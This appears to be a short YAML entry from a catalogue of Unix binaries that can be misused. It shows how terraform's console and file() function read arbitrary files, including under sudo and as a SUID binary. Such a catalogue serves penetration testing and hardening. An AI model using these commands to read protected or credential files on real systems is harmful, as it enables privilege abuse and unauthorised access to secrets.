---
functions:
  file-read:
    - code: |
        terraform console
        file("file_to_read")
  sudo:
    - code: |
        sudo terraform console
        file("file_to_read")
  suid:
    - code: |
        ./terraform console
        file("file_to_read")
---
